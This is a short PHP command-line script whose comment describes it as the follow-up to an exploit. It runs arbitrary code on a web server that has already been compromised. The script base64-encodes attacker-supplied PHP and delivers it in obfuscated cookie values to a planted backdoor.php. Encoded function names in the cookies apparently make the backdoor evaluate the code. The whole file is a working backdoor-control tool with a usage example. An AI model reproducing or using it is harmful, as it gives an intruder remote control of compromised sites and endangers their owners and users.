<?php
/**
 * Once a site has been compromised with exploit.php, the contents of $code will
 * be executed on the server hosting $url.
 *
 * @usage
 * php /path/to/this/file "http://example.com/modules/poll/backdoor.php" "print 'hello world';"
 */
$url = $argv[1];
$c = curl_init($url);
$code = base64_encode($argv[2]);
curl_setopt($c, CURLOPT_COOKIE, 'Kcqf3=base64_decode;Kcqf2=cHJlZ19yZXBsYWNl;Kcqf1=' . $code . ';');
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
$page = curl_exec($c);
print $page;
